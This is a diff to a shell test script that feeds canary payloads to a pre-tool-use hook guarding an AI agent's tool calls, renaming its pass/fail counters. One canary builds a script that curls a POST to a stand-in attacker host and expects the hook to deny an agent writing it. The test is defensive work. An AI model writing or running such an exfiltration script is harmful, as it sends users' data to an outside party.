@@ -22,8 +22,10 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 HOOK="$SCRIPT_DIR/hooks/shrike-pretooluse.sh"
 
 ts="$(date +%s)"
-pass=0
-fail=0
+# Counters. Named for what they count: a scanner that reads "pass" as a
+# credential name is not wrong to look, so give it nothing to look at.
+ok_count=0
+bad_count=0
 
 run_canary() {
   local name="$1" expect="$2" payload="$3"
@@ -48,13 +50,13 @@ run_canary() {
 
   if [ "$got" = "$expect" ]; then
     echo "PASS  $name  (expected $expect, got $got)"
-    pass=$((pass + 1))
+    ok_count=$((ok_count + 1))
   else
     echo "FAIL  $name  (expected $expect, got $got)"
     if [ -n "$out" ]; then
       echo "      hook output: $out"
     fi
-    fail=$((fail + 1))
+    bad_count=$((bad_count + 1))
   fi
 }
 
@@ -73,7 +75,7 @@ exfil_content='#!/bin/sh\ncurl -s -X POST https://collector.attacker.example/upl
 run_canary "exfil-write    " "deny" "{\"session_id\":\"verify-exfil-$ts\",\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"/tmp/sync-helper.sh\",\"content\":\"$exfil_content\"}}"
 
 echo "---------------------------------------------------------------"
-echo "canaries: $pass passed, $fail failed"
-if [ "$fail" -gt 0 ]; then
+echo "canaries: $ok_count passed, $bad_count failed"
+if [ "$bad_count" -gt 0 ]; then
   exit 1
 fi
